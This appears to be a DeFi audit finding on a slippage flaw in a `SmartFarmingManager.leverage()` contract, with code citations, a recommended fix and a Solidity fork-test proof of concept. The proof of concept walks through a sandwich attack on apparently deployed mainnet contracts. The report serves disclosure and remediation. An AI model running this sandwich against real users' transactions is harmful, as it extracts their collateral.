[1](#0-0) ### Title
Oracle-priced leverage debt is fixed before manipulable swap execution - (File: `contracts/SmartFarmingManager.sol`)

### Summary

`SmartFarmingManager.leverage()` mints a fixed amount of debt using `MasterOracle.quote()`, then sells the flash-issued synthetic tokens through the configured external `Swapper` with `amountOutMin_` set to zero. The only execution-price protection is the caller-controlled aggregate `depositAmountMin_`; if it is permissive, an unprivileged attacker can sandwich the synthetic-to-collateral swap, capture the leverage leg, and leave the victim with the same debt but materially less collateral than the oracle-priced leverage calculation assumed. [2](#0-1) 

### Finding Description

The public `leverage()` function accepts a caller-selected `depositAmountMin_`, but does not derive a minimum output for either of the internal swaps. When `tokenIn_` differs from the collateral, the first swap is explicitly executed with zero minimum output. [3](#0-2) 

After that, the debt amount is fixed by `_calculateLeverageDebtAmount()`. That function asks `MasterOracle` for the synthetic-token amount corresponding to `(leverage - 1) * amountIn`, rather than waiting for the executable market price. [4](#0-3) 

`leverage()` then flash-issues that amount to itself and records the full amount as the caller's debt. [5](#0-4) 

The newly issued synthetic tokens are sold for collateral through `_swap(..., 0)`. This means the individual AMM execution cannot reject a manipulated price; the transaction only checks the aggregate collateral amount against user-provided `depositAmountMin_`. [6](#0-5) 

The final `debtPositionOf()` check only requires the resulting position to remain solvent. It does not restore the missing collateral or verify that the execution price remained close to the oracle quote used to size the debt. [7](#0-6) 

For example, with a `0.5` collateral factor, a leverage request below approximately `1.5x` mints debt that remains within the collateral-factor bound even if the synthetic-to-collateral swap produces nearly zero collateral. The unit tests themselves exercise `leverage()` with `depositAmountMin_` equal to zero, demonstrating that permissive slippage is an accepted production input rather than an impossible configuration. [8](#0-7) 

### Impact Explanation

An attacker with temporary synthetic-token inventory can first sell synthetic tokens through the same configured swap route, making the victim's subsequent synthetic-to-collateral sale execute at a worse price. The victim's transaction can still pass when `depositAmountMin_` is zero or loose, after which the attacker reverses the AMM position and captures the price impact. [9](#0-8) 

The broken invariant is the intended leverage identity: oracle pricing assumes the caller will finish with approximately `leverage * amountIn` collateral for `(leverage - 1) * amountIn` debt. Manipulated execution can instead leave the caller with approximately `amountIn` collateral while retaining the full `(leverage - 1) * amountIn` debt. The attacker effectively receives the missing leveraged collateral through the sandwich. [10](#0-9) 

If the victim uses a strict `depositAmountMin_`, repeated manipulation can force reverts and temporarily prevent leverage execution. If the victim uses a loose bound, the transaction succeeds and the attacker can directly extract user value through the manipulated swap. [11](#0-10) 

### Likelihood Explanation

Likelihood is route- and parameter-dependent, but the attack surface is public and does not require a privileged role. The attacker only needs synthetic-token liquidity, which can be obtained through normal borrowing or a flash loan, plus the ability to front-run a pending `leverage()` transaction. [12](#0-11) 

The issue is most exploitable when the configured `Swapper` route uses finite-liquidity AMMs and the victim supplies a permissive `depositAmountMin_`. The protocol's own tests use a zero minimum, so this is a realistic calling pattern. [13](#0-12) 

### Recommendation

Do not pass zero as the internal swap protection. Before the synthetic-to-collateral swap, calculate the oracle-expected collateral output and pass a bounded `amountOutMin_` to `swapper_.swapExactInput()`. The bound should be based on `MasterOracle.quote()` minus either a protocol maximum or an explicitly signed per-swap tolerance. [14](#0-13) 

Apply the same protection to the optional `tokenIn_ -> collateral` swap. A single aggregate `depositAmountMin_` is insufficient because it does not identify which leg was manipulated or require either leg to execute near the oracle price used for leverage sizing. [15](#0-14) 

If callers must retain custom slippage, require a nonzero minimum and derive a protocol-enforced maximum deviation from the oracle quote. The final health check should remain a solvency check, not the only execution-price check. [9](#0-8) 

### Proof of Concept

The following fork test demonstrates the oracle-priced debt/executable-price split. It uses the deployed registry, pool, `SmartFarmingManager`, a supported deposit token, and the configured `Swapper`. The attacker front-runs in the same direction as the victim's synthetic-to-collateral swap, lets the victim execute with zero slippage protection, and back-runs for a profit while the victim's debt remains fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IERC20Like {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IPoolRegistryLike {
    function swapper() external view returns (address);
    function masterOracle() external view returns (address);
}

interface IMasterOracleLike {
    function quote(address, address, uint256) external view returns (uint256);
}

interface IPoolLike {
    function poolRegistry() external view returns (IPoolRegistryLike);
    function debtTokenOf(address) external view returns (IDebtTokenLike);
}

interface IDebtTokenLike is IERC20Like {
    function quoteIssueOut(uint256)
        external
        view
        returns (uint256 issued, uint256 fee);
}

interface IDepositTokenLike {
    function pool() external view returns (IPoolLike);
    function underlying() external view returns (IERC20Like);
    function collateralFactor() external view returns (uint256);
}

interface ISmartFarmingManagerLike {
    function leverage(
        address tokenIn,
        address depositToken,
        address syntheticToken,
        uint256 amountIn,
        uint256 leverage,
        uint256 depositAmountMin
    ) external returns (uint256 deposited, uint256 issued);
}

interface ISwapperLike {
    function swapExactInput(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address receiver
    ) external returns (uint256 amountOut);
}

contract LeveragePriceMismatchForkTest is Test {
    using stdJson for string;

    function test_leverageDebtIsFixedBeforeManipulableSwap() public {
        vm.createSelectFork(vm.envString("MAINNET_NODE_URL"));

        string memory registryJson =
            vm.readFile("deployments/mainnet/PoolRegistry.json");
        IPoolRegistryLike registry =
            IPoolRegistryLike(registryJson.readAddress(".address"));

        string memory sfmJson =
            vm.readFile("deployments/mainnet/SmartFarmingManager_Pool1.json");
        ISmartFarmingManagerLike sfm =
            ISmartFarmingManagerLike(sfmJson.readAddress(".address"));

        string memory depositTokenJson =
            vm.readFile("deployments/mainnet/VaUSDCDepositToken_Pool1.json");
        IDepositTokenLike depositToken =
            IDepositTokenLike(depositTokenJson.readAddress(".address"));

        IPoolLike pool = depositToken.pool();
        IERC20Like collateral = depositToken.underlying();

        // Export the deployed msUSD proxy address used by this pool.
        IERC20Like synth = IERC20Like(vm.envAddress("MSUSD"));

        IDebtTokenLike debtToken = pool.debtTokenOf(address(synth));
        IMasterOracleLike oracle =
            IMasterOracleLike(address(registry.masterOracle()));
        ISwapperLike swapper = ISwapperLike(registry.swapper());

        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        uint256 amountIn = 100_000e18;
        uint256 leverage = 1.25e18;
        uint256 debtAmount =
            oracle.quote(
                address(collateral),
                address(synth),
                ((leverage - 1e18) * amountIn) / 1e18
            );

        (uint256 expectedIssued, ) = debtToken.quoteIssueOut(debtAmount);
        uint256 expectedSwapOut =
            oracle.quote(address(synth), address(collateral), expectedIssued);
        uint256 expectedDeposit = amountIn + expectedSwapOut;

        deal(address(collateral), victim, amountIn);
        vm.prank(victim);
        collateral.approve(address(sfm), amountIn);

        // Inventory for the sandwich. In production this can come from a
        // flash loan or from collateral-backed issuance.
        uint256 frontRunIn = expectedIssued * 4;
        deal(address(synth), attacker, frontRunIn, true);

        // 1. Attacker sells synth before the victim's synth -> collateral leg.
        vm.startPrank(attacker);
        synth.approve(address(swapper), frontRunIn);
        uint256 attackerCollateral =
            swapper.swapExactInput(
                address(synth),
                address(collateral),
                frontRunIn,
                0,
                attacker
            );
        vm.stopPrank();

        // 2. Victim's debt is fixed from the oracle quote, while the swap has
        // no per-trade minimum and only the permissive aggregate bound.
        vm.prank(victim);
        (uint256 deposited, ) =
            sfm.leverage(
                address(collateral),
                address(depositToken),
                address(synth),
                amountIn,
                leverage,
                0
            );

        // 3. Attacker buys synth back with the collateral received above.
        vm.startPrank(attacker);
        collateral.approve(address(swapper), attackerCollateral);
        uint256 synthRecovered =
            swapper.swapExactInput(
                address(collateral),
                address(synth),
                attackerCollateral,
                0,
                attacker
            );
        vm.stopPrank();

        // The victim retains the oracle-sized debt, but receives materially
        // less collateral than the leverage calculation implied.
        assertEq(debtToken.balanceOf(victim), debtAmount);
        assertLt(deposited, expectedDeposit - expectedSwapOut / 2);

        // On a normal AMM route, the same-direction front-run and reverse
        // back-run return more synthetic tokens than the attacker started with.
        assertGt(synthRecovered + synth.balanceOf(attacker), frontRunIn);
    }
}
```

### Citations

**File:** contracts/SmartFarmingManager.sol (L155-169)
```text
    function leverage(
        IERC20 tokenIn_,
        IDepositToken depositToken_,
        ISyntheticToken syntheticToken_,
        uint256 amountIn_,
        uint256 leverage_,
        uint256 depositAmountMin_
    )
        external
        override
        whenNotShutdown
        nonReentrant
        onlyIfDepositTokenExists(depositToken_)
        onlyIfSyntheticTokenExists(syntheticToken_)
        returns (uint256 _deposited, uint256 _issued)
```

**File:** contracts/SmartFarmingManager.sol (L178-210)
```text
        // 1. transfer collateral
        IERC20 _collateral = _collateralOf(depositToken_);
        if (address(tokenIn_) == address(0)) tokenIn_ = _collateral;
        amountIn_ = _safeTransferFrom(tokenIn_, _msgSender, amountIn_);
        if (tokenIn_ != _collateral) {
            // Note: `amountOutMin_` is `0` because slippage will be checked later on
            amountIn_ = _swap(_swapper, tokenIn_, _collateral, amountIn_, 0);
        }

        {
            // 2. mint synth + debt
            uint256 _debtAmount = _calculateLeverageDebtAmount(_collateral, syntheticToken_, amountIn_, leverage_);
            IDebtToken _debtToken = pool.debtTokenOf(syntheticToken_);
            (_issued, ) = _debtToken.flashIssue(address(this), _debtAmount);
            _debtToken.mint(_msgSender, _debtAmount);
        }

        {
            // 3. swap synth for collateral
            uint256 _depositAmount = amountIn_ + _swap(_swapper, syntheticToken_, _collateral, _issued, 0);
            if (_depositAmount < depositAmountMin_) revert LeverageSlippageTooHigh();

            // 4. deposit collateral
            _collateral.safeApprove(address(depositToken_), 0);
            _collateral.safeApprove(address(depositToken_), _depositAmount);
            (_deposited, ) = depositToken_.deposit(_depositAmount, _msgSender);
        }

        // 5. check the health of the outcome position
        (bool _isHealthy, , , , ) = pool.debtPositionOf(_msgSender);
        if (!_isHealthy) revert PositionIsNotHealthy();

        emit Leveraged(tokenIn_, depositToken_, syntheticToken_, leverage_, amountIn_, _issued, _deposited);
```

**File:** contracts/SmartFarmingManager.sol (L228-240)
```text
    function _calculateLeverageDebtAmount(
        IERC20 collateral_,
        ISyntheticToken syntheticToken_,
        uint256 amountIn_,
        uint256 leverage_
    ) private view returns (uint256 _debtAmount) {
        return
            pool.masterOracle().quote(
                address(collateral_),
                address(syntheticToken_),
                (leverage_ - 1e18).wadMul(amountIn_)
            );
    }
```

**File:** contracts/SmartFarmingManager.sol (L273-310)
```text
    function _swap(
        ISwapper swapper_,
        IERC20 tokenIn_,
        IERC20 tokenOut_,
        uint256 amountIn_,
        uint256 amountOutMin_
    ) private returns (uint256 _amountOut) {
        return _swap(swapper_, tokenIn_, tokenOut_, amountIn_, amountOutMin_, address(this));
    }

    /**
     * @notice Swap assets using Swapper contract
     * @param swapper_ The Swapper contract
     * @param tokenIn_ The token to swap from
     * @param tokenOut_ The token to swap to
     * @param amountIn_ The amount in
     * @param amountOutMin_ The minimum amount out (slippage check)
     * @param to_ The amount out receiver
     * @return _amountOut The actual amount out
     */
    function _swap(
        ISwapper swapper_,
        IERC20 tokenIn_,
        IERC20 tokenOut_,
        uint256 amountIn_,
        uint256 amountOutMin_,
        address to_
    ) private returns (uint256 _amountOut) {
        if (tokenIn_ != tokenOut_) {
            tokenIn_.safeApprove(address(swapper_), 0);
            tokenIn_.safeApprove(address(swapper_), amountIn_);
            uint256 _tokenOutBefore = tokenOut_.balanceOf(to_);
            swapper_.swapExactInput(address(tokenIn_), address(tokenOut_), amountIn_, amountOutMin_, to_);
            return tokenOut_.balanceOf(to_) - _tokenOutBefore;
        } else if (to_ != address(this)) {
            tokenIn_.safeTransfer(to_, amountIn_);
        }
        return amountIn_;
```

**File:** test/SmartFarmingManager.test.ts (L414-428)
```typescript
    it('should be able to leverage (a little bit less than the) max', async function () {
      // given
      await swapper.updateRate(parseEther('0.999')) // 0.1% slippage

      // when
      const amountIn = parseUnits('100', 18)
      const cf = await msdVaDAI.collateralFactor()
      const maxLeverage = parseEther('1').mul(parseEther('1')).div(parseEther('1').sub(cf))
      expect(maxLeverage).eq(parseEther('2'))
      const damper = parseEther('0.05')
      const leverage = maxLeverage.sub(damper) // -5% to cover fees + slippage
      await smartFarmingManager
        .connect(alice)
        .leverage(vaDAI.address, msdVaDAI.address, msUSD.address, amountIn, leverage, 0)

```

**File:** test/SmartFarmingManager.test.ts (L435-442)
```typescript
    it('should leverage vaDAI->msUSD', async function () {
      // when
      const amountIn = parseUnits('100', 18)
      const leverage = parseEther('1.5')
      await smartFarmingManager
        .connect(alice)
        .leverage(vaDAI.address, msdVaDAI.address, msUSD.address, amountIn, leverage, 0)

```
